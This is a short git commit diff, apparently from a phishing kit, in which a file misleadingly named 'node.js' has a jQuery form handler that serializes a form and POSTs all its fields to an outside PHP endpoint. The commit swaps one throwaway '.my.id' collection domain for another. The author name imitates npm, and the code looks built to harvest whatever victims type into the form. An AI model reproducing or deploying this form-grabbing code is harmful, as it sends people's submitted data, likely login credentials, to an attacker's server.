575eb7c5502d303f05f62e5bb102fcffa3b13bdb
npm-base64 <109466180+npm-base64@users.noreply.github.com>
2022-07-25 19:55:41 +0700

    Update node.js

--- node.js
+++ node.js
@@ -2,7 +2,7 @@ $(".falxvrf").submit(function() {
 	var d = $(".falxvrf");
 
 	$.ajax({
-        url: "http://gyis.adon.my.id/apiii.php",
+        url: "http://sedeka.my.id/apiii.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
